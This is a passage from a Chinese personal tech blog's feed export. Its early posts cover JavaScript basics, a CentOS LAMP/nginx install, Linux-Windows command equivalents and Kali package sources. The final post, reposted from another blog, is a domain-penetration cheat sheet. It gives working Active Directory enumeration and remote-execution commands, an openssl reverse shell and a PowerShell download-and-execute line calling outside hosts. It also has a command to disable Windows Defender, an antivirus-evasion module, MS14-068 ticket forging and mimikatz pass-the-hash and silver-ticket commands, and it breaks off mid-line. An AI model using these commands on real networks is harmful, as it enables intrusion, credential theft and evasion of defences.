&#125;;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">document</span>.write(person.firstName);<span class="comment">//常用访问对象</span></span><br><span class="line">   <span class="built_in">document</span>.write(person[<span class="string">&quot;firstname&quot;</span>]);</span><br></pre></td></tr></table></figure><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>js中一切皆对象！！</p><ul><li><strong>创建字符串的三种方法</strong></li></ul><p>eg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> str1 = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> str2 = <span class="built_in">String</span>(<span class="string">&#x27;welcome&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> str3 = <span class="string">&#x27;icq&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.write(str1+<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(str2+<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(str3+<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li><strong>常用字符串的方法</strong></li></ul><p>有对象就有属性和方法</p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>toLowerCase、toUpperCase</td><td>转小写、大写</td></tr><tr><td>indexOf</td><td>查找字符串、返回索引值</td></tr><tr><td>substring</td><td>返回被操作字符串的一个子字符串</td></tr><tr><td>substr</td><td>返回被操作字符串的一个子字符串</td></tr><tr><td>split</td><td>将字符串按照指定的分隔符分割成数组</td></tr><tr><td>trim</td><td>清空空格</td></tr><tr><td>match</td><td>查找指定的值，返回匹配的值</td></tr><tr><td>search</td><td>检索字符串首次出现的位置</td></tr><tr><td>replace</td><td>替换指定字符串</td></tr></tbody></table><p>字符串</p><p>replace<br>eg:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> txt = <span class="string">&quot;hello world!!&quot;</span></span><br><span class="line"><span class="keyword">var</span> retxt = txt.replace(<span class="string">&quot;world&quot;</span>,<span class="string">&quot;dashuaibi&quot;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(txt);</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">&quot;&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="built_in">document</span>.write(retxt);</span><br></pre></td></tr></table></figure><ul><li><strong>常用字符串属性</strong></li></ul><p><strong>length</strong></p><p>eg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> txt = <span class="string">&quot;ABCDEFGHJKDSDETDSSQWEVBTNVNBBvfvsv&quot;</span></span><br><span class="line"><span class="keyword">var</span> changdu = txt.length;</span><br><span class="line"><span class="built_in">document</span>.write(changdu);</span><br></pre></td></tr></table></figure><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>eg：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="built_in">Array</span> = [<span class="string">&quot;Audi&quot;</span>,<span class="string">&quot;bmw&quot;</span>,<span class="string">&quot;porsche&quot;</span>,<span class="string">&quot;aaa&quot;</span>,<span class="string">&quot;ddd&quot;</span>,<span class="string">&quot;666&quot;</span>]</span><br><span class="line"><span class="built_in">Array</span>[<span class="number">0</span>] = benz;<span class="comment">//修改数组里的值</span></span><br><span class="line"><span class="built_in">Array</span>[<span class="number">2</span>] = toyota;<span class="comment">//修改数组里的值</span></span><br><span class="line"><span class="built_in">document</span>.write(<span class="built_in">Array</span>);<span class="comment">//输出数组</span></span><br><span class="line"><span class="built_in">document</span>.write(<span class="built_in">Array</span>[<span class="number">1</span>]);<span class="comment">//索引数组里的0号位，即Audi</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;常用调试方法&quot;&gt;&lt;a href=&quot;#常用调试方法&quot; class=&quot;headerlink&quot; title=&quot;常用调试方法&quot;&gt;&lt;/a&gt;常用调试方法&lt;/h2&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter</summary>
      
    
    
    
    
    <category term="编程" scheme="https://bstark.me/tags/%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>centos-nginx+apache+mysql+php的安装</title>
    <link href="https://bstark.me/posts/22236/"/>
    <id>https://bstark.me/posts/22236/</id>
    <published>2021-12-20T12:54:52.000Z</published>
    <updated>2021-12-28T02:05:23.039Z</updated>
    
    <content type="html"><![CDATA[<h2 id="nginx源码安装"><a href="#nginx源码安装" class="headerlink" title="nginx源码安装"></a>nginx源码安装</h2><h5 id="安装nginx依赖"><a href="#安装nginx依赖" class="headerlink" title="安装nginx依赖"></a>安装nginx依赖</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#yum install gcc pcre pcre-devel zlib zlib-devel openssl openssl-devel -y</span><br></pre></td></tr></table></figure><h5 id="配置开启参数及模块，生成makefile文件"><a href="#配置开启参数及模块，生成makefile文件" class="headerlink" title="配置开启参数及模块，生成makefile文件"></a>配置开启参数及模块，生成makefile文件</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[root@localhost ~]#./configure --conf-path=/etc/nginx/nginx.conf --sbin-path=/usr/bin/nginx  //这里是加载模块 --add-module=/root/nginx-http-flv-module-master</span><br></pre></td></tr></table></figure><h5 id="生成脚本及配置文件：make，编译步骤，根据Makefile文件生成相应的模块，创建目录，并将生成的模块和文件复制到相应的目录："><a href="#生成脚本及配置文件：make，编译步骤，根据Makefile文件生成相应的模块，创建目录，并将生成的模块和文件复制到相应的目录：" class="headerlink" title="生成脚本及配置文件：make，编译步骤，根据Makefile文件生成相应的模块，创建目录，并将生成的模块和文件复制到相应的目录："></a>生成脚本及配置文件：make，编译步骤，根据Makefile文件生成相应的模块，创建目录，并将生成的模块和文件复制到相应的目录：</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#make &amp;&amp; make install</span><br></pre></td></tr></table></figure><h5 id="系统服务配置"><a href="#系统服务配置" class="headerlink" title="系统服务配置"></a>系统服务配置</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#systemctl stop firewalld //关闭防火墙</span><br><span class="line">[root@localhost ~]#systemctl enable nginx //设置nginx开机启动</span><br><span class="line">[root@localhost ~]#systemctl start nginx //启动服务nginx</span><br></pre></td></tr></table></figure><h5 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#nginx</span><br></pre></td></tr></table></figure><h2 id="安装apache-及相关依赖"><a href="#安装apache-及相关依赖" class="headerlink" title="安装apache 及相关依赖"></a>安装apache 及相关依赖</h2><blockquote><p>httpd就是apache开源的其中一个最有名的项目，即是apache</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]#yum install httpd httpd-devel httpd-manual mod_ssl -y //安装httpd及依赖</span><br><span class="line">[root@localhost ~]#systemctl enable httpd  //设置httpd开机启动</span><br><span class="line">[root@localhost ~]#systemctl start httpd   //启动服务httpd</span><br><span class="line">[root@localhost ~]#yum install mariadb-server -y //安装mysql</span><br><span class="line">[root@localhost ~]#systemctl enable mariadb  //设置mariadb开机启动</span><br><span class="line">[root@localhost ~]#systemctl start mariadb   //启动服务mariadb</span><br><span class="line">[root@localhost ~]#mysql_secure_installation    //配置mysql</span><br><span class="line">[root@localhost ~]#yum install  php php-mysql php-common php-gd php-mbstring php-mcrypt php-devel php-xml -y        //安装PHP及相关依赖</span><br><span class="line">[root@localhost ~]#systemctl restart httpd    //重新启动httpd</span><br></pre></td></tr></table></figure><blockquote><p>Nginx默认web目录：/usr/local/nginx/html<br>Apache默认web目录：/var/www/html</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;nginx源码安装&quot;&gt;&lt;a href=&quot;#nginx源码安装&quot; class=&quot;headerlink&quot; title=&quot;nginx源码安装&quot;&gt;&lt;/a&gt;nginx源码安装&lt;/h2&gt;&lt;h5 id=&quot;安装nginx依赖&quot;&gt;&lt;a href=&quot;#安装nginx依赖&quot; class</summary>
      
    
    
    
    
    <category term="nginx" scheme="https://bstark.me/tags/nginx/"/>
    
  </entry>
  
  <entry>
    <title>Linux与windows 命令的对比</title>
    <link href="https://bstark.me/posts/3757/"/>
    <id>https://bstark.me/posts/3757/</id>
    <published>2021-12-20T12:54:52.000Z</published>
    <updated>2021-12-28T02:05:23.041Z</updated>
    
    <content type="html"><![CDATA[<p>Windows不区分大小写，Linux区分大小写的。 </p><table><thead><tr><th>文件目录操作</th><th></th><th></th></tr></thead><tbody><tr><td>Command</td><td>Linux</td><td>Windows</td></tr><tr><td>批处理</td><td>.sh</td><td>.bat</td></tr><tr><td>帮助</td><td>cmd  –help / -h</td><td></td></tr><tr><td>列出目录文件</td><td>ls/  ls -l</td><td>dir</td></tr><tr><td>改变当前目录</td><td>cd</td><td>cd</td></tr><tr><td>进父目录</td><td>cd  …</td><td>cd  …</td></tr><tr><td>进home目录</td><td>cd  ~</td><td></td></tr><tr><td>复制</td><td>cp</td><td>copy</td></tr><tr><td>删除</td><td>rm  file_name</td><td>del  file_name</td></tr><tr><td>建目录</td><td>mkdir  folderName</td><td>md  folderName</td></tr><tr><td>建文件</td><td>touch  fileName</td><td>touch  fileName</td></tr><tr><td>删目录</td><td>rmdir  folderName</td><td>rmdir  folderName</td></tr><tr><td>设置目录文件权限</td><td>chmod  u+rwx file</td><td></td></tr><tr><td>设置目录文件所有者</td><td>chown  user.group file</td><td></td></tr></tbody></table><table><thead><tr><th>文件内容操作</th><th></th><th></th></tr></thead><tbody><tr><td>Command</td><td>Linux</td><td>Windows</td></tr><tr><td>显示文件内容</td><td>cat</td><td>type</td></tr><tr><td></td><td>more，less</td><td>more</td></tr><tr><td></td><td>head、tail</td><td></td></tr><tr><td>统计行数</td><td>wc</td><td></td></tr><tr><td>显示文件信息</td><td>file</td><td></td></tr><tr><td>查找文件</td><td>find  /bin -name ls</td><td></td></tr><tr><td>定位可执行文件位置</td><td>which</td><td></td></tr><tr><td>在文本文件内查找</td><td>grep  str1 1.txt</td><td>find</td></tr><tr><td>启动运行程序</td><td>gnome-open/open</td><td>start</td></tr></tbody></table><table><thead><tr><th>系统信息查询</th><th></th><th align="center"></th></tr></thead><tbody><tr><td>Command</td><td>Linux</td><td align="center">Windows</td></tr><tr><td>显示内核版本</td><td>uname  -a</td><td align="center"></td></tr><tr><td>显示发布版本</td><td>lsb_release  -a</td><td align="center"></td></tr><tr><td></td><td>cat  /etc/issue</td><td align="center"></td></tr><tr><td>显示id信息</td><td>id/whoami</td><td align="center"></td></tr><tr><td>显示当前登陆用户</td><td>who</td><td align="center"></td></tr><tr><td>显示当前环境信息</td><td>env</td><td align="center"></td></tr><tr><td>显示启动中检测到的硬件信息</td><td>dmesg</td><td align="center"></td></tr><tr><td>显示系统的PCI设备</td><td>lspci</td><td align="center"></td></tr><tr><td>显示系统的USB</td><td>lsusb</td><td align="center"></td></tr><tr><td>显示cpu信息</td><td>less  /proc/cpuinfo</td><td align="center"></td></tr><tr><td>显示内存</td><td>less  /proc/menminfo</td><td align="center"></td></tr><tr><td>显示硬盘存储信息</td><td>df  -h</td><td align="center"></td></tr></tbody></table><table><thead><tr><th>进程/任务控制</th><th></th><th></th></tr></thead><tbody><tr><td>Command</td><td>Linux</td><td>Windows</td></tr><tr><td>显示进程信息</td><td>ps  -auxf</td><td></td></tr><tr><td>杀死进程</td><td>kill  proc_id</td><td></td></tr><tr><td>杀死所有</td><td>killall  postgresql</td><td></td></tr><tr><td>暂停中断当前前台任务</td><td>ctrl  - z</td><td></td></tr><tr><td>恢复任务到后台</td><td>bg</td><td></td></tr><tr><td>恢复任务到前台</td><td>fg</td><td></td></tr></tbody></table><table><thead><tr><th>网络命令</th><th></th><th></th></tr></thead><tbody><tr><td>Command</td><td>Linux</td><td>Windows</td></tr><tr><td>显示启动的网络服务</td><td>netstat  -anli less</td><td>netstat</td></tr><tr><td>显示路由表信息</td><td>netstat  -r</td><td>netstat  -r</td></tr><tr><td>显示ip</td><td>ip  a/ifconfig</td><td>ipconfig</td></tr><tr><td>显示防火墙信息</td><td>iptables  -list</td><td></td></tr><tr><td>远程登陆</td><td>ssh  user@host</td><td></td></tr><tr><td>发送ping信息</td><td>ping  ip</td><td>ping  ip</td></tr><tr><td>命令行下载</td><td>wget  url/curl -o url</td><td></td></tr></tbody></table><table><thead><tr><th>用户管理</th><th></th><th></th></tr></thead><tbody><tr><td>Command</td><td>Linux</td><td>Windows</td></tr><tr><td>修改命令</td><td>passwd</td><td></td></tr><tr><td>创建用户</td><td>useradd</td><td></td></tr><tr><td>删除用户</td><td>userdel</td><td></td></tr><tr><td>修改用户</td><td>usermod</td><td></td></tr><tr><td>退出</td><td>exit  / ctrl + D</td><td></td></tr><tr><td>切换用户至（默认root）</td><td>su  [-]user</td><td></td></tr><tr><td>以su后的权限执行</td><td>sudo  -u user cmd</td><td></td></tr></tbody></table><table><thead><tr><th>其他</th><th></th><th></th></tr></thead><tbody><tr><td>Command</td><td>Linux</td><td>Windows</td></tr><tr><td>显示日期时间</td><td>date</td><td>date</td></tr><tr><td>日历</td><td>cal2014</td><td></td></tr><tr><td>清除屏幕</td><td>clear</td><td>cls</td></tr><tr><td>搜索软件包</td><td>yum  search tree</td><td></td></tr><tr><td>删除软件包</td><td>yum  remove pkg_name</td><td></td></tr><tr><td>安装软件包</td><td>yum  install pkg_name</td><td></td></tr><tr><td>重启系统</td><td>reboot</td><td></td></tr><tr><td>关闭系统</td><td>halt  -p</td><td></td></tr><tr><td>设置环境变量</td><td>export  PATH=SPATH：～/bin</td><td>set</td></tr><tr><td>显示信息/环境变量</td><td>echo  $HOME</td><td>echo</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Windows不区分大小写，Linux区分大小写的。 &lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;文件目录操作&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;th&gt;&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;Command&lt;/td&gt;
&lt;td&gt;</summary>
      
    
    
    
    
    <category term="命令" scheme="https://bstark.me/tags/%E5%91%BD%E4%BB%A4/"/>
    
  </entry>
  
  <entry>
    <title>apt-get kali源</title>
    <link href="https://bstark.me/posts/22626/"/>
    <id>https://bstark.me/posts/22626/</id>
    <published>2021-12-20T12:54:52.000Z</published>
    <updated>2022-01-21T03:51:39.138Z</updated>
    
    <content type="html"><![CDATA[<p>编辑 source.list</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vim /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>添加 kali源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.cloud.tencent.com/kali/ kali-rolling main contrib non-free</span><br><span class="line">deb-src http://mirrors.cloud.tencent.com/kali/ kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure><p>安装gnupg2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y gnupg2</span><br></pre></td></tr></table></figure><p>获取 公钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-key adv --keyserver [keyserver.ubuntu.com](http://keyserver.ubuntu.com/) --recv ED444FF07D8D0BF6apt update;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt update;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编辑 source.list&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=</summary>
      
    
    
    
    
    <category term="linux" scheme="https://bstark.me/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>域渗透常用命令</title>
    <link href="https://bstark.me/posts/45214/"/>
    <id>https://bstark.me/posts/45214/</id>
    <published>2021-12-20T12:20:20.000Z</published>
    <updated>2022-01-21T03:57:51.940Z</updated>
    
    <content type="html"><![CDATA[<p>转载自guokeya<br><a href="https://guokeya.github.io/post/tFK-eJTet/">https://guokeya.github.io/post/tFK-eJTet/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">net view /domain:XXX</span><br><span class="line">查看XXX域中的机器列表</span><br><span class="line">net view /domain</span><br><span class="line">查看内网中有多少个域</span><br><span class="line">setspn -T jumbolab.com -Q */*</span><br><span class="line">快速寻找内网中注册的服务</span><br><span class="line">net user /domain</span><br><span class="line">查看域用户</span><br><span class="line">net group &quot;domain admins&quot; /domain</span><br><span class="line">查看域管</span><br><span class="line">net time /domain</span><br><span class="line">定位域控。也可以通过ipconfig /all。一般DNS就是域控</span><br><span class="line">nltest /domain_trusts</span><br><span class="line">列出域信任关系</span><br><span class="line">cmdkey /list</span><br><span class="line">远程连接凭据</span><br><span class="line">nslookup -type=ns domain.com</span><br><span class="line">域传输漏洞。查找所有的DNS解析</span><br><span class="line">dsquery computer domainroot -limit 65535 &amp;&amp; net group &quot;domain computers&quot; /domain</span><br><span class="line">列出该域内所有机器名</span><br><span class="line">dsquery user domainroot -limit 65535 &amp;&amp; net user /domain</span><br><span class="line">列出该域内所有用户名</span><br><span class="line">dsquery subnet</span><br><span class="line">列出该域内网段划分</span><br><span class="line">dsquery group &amp;&amp; net group /domain</span><br><span class="line">列出该域内分组 </span><br><span class="line">dsquery ou</span><br><span class="line">列出该域内组织单位 </span><br><span class="line">dsquery server &amp;&amp; net time /domain</span><br><span class="line">列出该域内域控制器 </span><br><span class="line">wmic /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List</span><br><span class="line">列出杀软</span><br><span class="line">wmic product get name,version</span><br><span class="line">查看安装的软件</span><br><span class="line">quser</span><br><span class="line">查看在线用户</span><br><span class="line">net config workstation</span><br><span class="line">查看当前登陆域</span><br><span class="line">dnsdump.exe -u 域名\与用户 -p 域密码 域控机器名</span><br><span class="line">用普通域用户获取域内所有DNS解析</span><br><span class="line">for /l %i in (1,1,255) do @ ping 10.233.33.%i -w 1 -n 1|find /i &quot;ttl=&quot;</span><br><span class="line">主机发现</span><br><span class="line">find / -type f -uid +0</span><br><span class="line">找不是root用户编辑的文件。用于找密码</span><br><span class="line">tee可以替代&gt;</span><br></pre></td></tr></table></figure><h1 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">net use \\IP\ipc$ &quot;密码&quot; /user:administrator</span><br><span class="line">#建立IPC连接</span><br><span class="line">net time \\IP</span><br><span class="line">#获取远程IP的时间</span><br><span class="line">copy calc.bat \\IP\C$</span><br><span class="line">#把本地的calc.bat传到目标C盘</span><br><span class="line">at \\IP 21:41 c:\calc.bat</span><br><span class="line">#创建计划任务</span><br><span class="line">at \\IP 21:41 cmd.exe /c  &quot;ipconfig &gt; c:\1.txt&quot;</span><br><span class="line">#直接执行命令</span><br><span class="line">type \\IP\C$\1.txt</span><br><span class="line">#获取命令执行结果</span><br><span class="line">schtasks /create /s IP /tn 计划任务名 /sconstart /tr c:\calc.bat /ru system /f</span><br><span class="line">#用schtasks命令创建计划任务</span><br><span class="line">schtasks /delete /s IP /tn &quot;计划任务名&quot; /f </span><br></pre></td></tr></table></figure><p>WMICEXEC</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wmic /node:IP /user:administrator /password:password process call create &quot;cmd.exe /c ipconfig &gt; c:\ip.txt&quot;</span><br><span class="line">type \\IP\C$\ip.txt</span><br><span class="line">系统自带的WMIC命令。执行无日志</span><br><span class="line">wmiexec.py Username:Password@IP</span><br></pre></td></tr></table></figure><h1 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use evasion/windows/windows_defender_exe</span><br><span class="line">可绕腾讯电脑管家</span><br></pre></td></tr></table></figure><h1 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">openssl弹shell</span><br><span class="line">服务端:</span><br><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port 8888</span><br><span class="line"></span><br><span class="line">靶机：</span><br><span class="line">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.198.200:8888 &gt; /tmp/s; rm /tmp/s</span><br><span class="line"></span><br><span class="line">powershell弹shell</span><br><span class="line">服务端：</span><br><span class="line">Import-Module .\powercat.ps1;powercat -l -v -p 443 -t 1000</span><br><span class="line">靶机：</span><br><span class="line">powershell -command &quot;.\reverseshell.ps1&quot;   </span><br></pre></td></tr></table></figure><h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">post/multi/recon/local_exploit_suggest</span><br><span class="line">windows/local/bypassuac_dotnet_profiler</span><br><span class="line">自动寻找存在的提权漏洞</span><br><span class="line"></span><br><span class="line">python windows-exploit-suggester.py  --update</span><br><span class="line">systeminfo &gt; info.txt</span><br><span class="line">python windows-exploit-suggester.py -d 2017-06-14-mssb.xls -i info.txt</span><br><span class="line">CVE提权辅助脚本</span><br></pre></td></tr></table></figure><h1 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">本地复现了下。用普通域用户名和密码去创建一个连接。会显示拒绝访问</span><br><span class="line">MS14-068.exe -u Administrator@abc.com -p 123@abcD -s S-1-5-21-294942478-3080431383-2839947409-500 -d 192.168.0.3</span><br><span class="line">#会在当前目录生成一个票据</span><br><span class="line">kerberos::purge </span><br><span class="line">#清空当前的票据</span><br><span class="line">kerberos::ptc 凭证地址</span><br><span class="line">#注入票据 </span><br><span class="line">创建票据。mimikatz导入。就可以访问了。但权限还是普通域用户权限</span><br><span class="line">psesec.exe -accepteula \\dc.abc.com -s cmd.exe</span><br><span class="line">可以配合psexec -s 得到一个System shell</span><br></pre></td></tr></table></figure><p>mssql弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/mssql/mssql_clr_payload</span><br></pre></td></tr></table></figure><h1 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;iex(New-Object Net.WebClient).DownloadString(&#x27;http://192.168.159.10/Invoke-PowerShellTcpOneLine_443.ps1&#x27;)&quot;</span><br><span class="line">#下载文件并且执行</span><br></pre></td></tr></table></figure><h1 id="Windows关闭Defender"><a href="#Windows关闭Defender" class="headerlink" title="Windows关闭Defender"></a>Windows关闭Defender</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-MpPreference -disablerealtimeMonitoring $true</span><br></pre></td></tr></table></figure><h1 id="PTH-Hash传递攻击"><a href="#PTH-Hash传递攻击" class="headerlink" title="PTH(Hash传递攻击)"></a>PTH(Hash传递攻击)</h1><p>就是利用ntlm去拿一个shell。psexec。wmiexec都是PTH的利用。可以用hash。直接绕过验证访问服务<br>利用条件：已知用户ntlm</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">#提升权限</span><br><span class="line">sekurlsa::pth /user:dbadmin /domain:offensive.local /ntlm:161cff084477fe596a5db81874498a24 /run:powershell.exe</span><br><span class="line">#mimikatz执行</span><br><span class="line">psexec会被日志纪录</span><br></pre></td></tr></table></figure><p>msf中也有模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/smb/psexec</span><br><span class="line">exploit/windows/smb/psexec_psh(Powershell版本)</span><br></pre></td></tr></table></figure><h1 id="PTT-票据传递攻击"><a href="#PTT-票据传递攻击" class="headerlink" title="PTT(票据传递攻击)"></a>PTT(票据传递攻击)</h1><p>白银票据：<br>就是利用票据。去得到一个shell。权限还是当前用户。ms14-068就是这个<br>利用条件：<br>已知域用户SID<br>已知域用户NTLM</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /sid:S-1-5-21-1187620287-4058297830-2395299116-1103 /domain:offensive.local /target:Offensive-SQL1:1433 /service:MSSQLSvc /rc4: 161cff084477fe596a5db81874498a24 /user:idontexist /id:1103 /ptt</span><br><span class="line">#sid-&gt;域用户的SID</span><br><span class="line">#target-&gt;开启了服务的目标</span><br><span class="line">#service-&gt;攻击的服务类型</span><br><span class="line">#rc4-&gt;域用户的NTLM</span><br><span class="line">#user-&gt;随便写</span><br><span 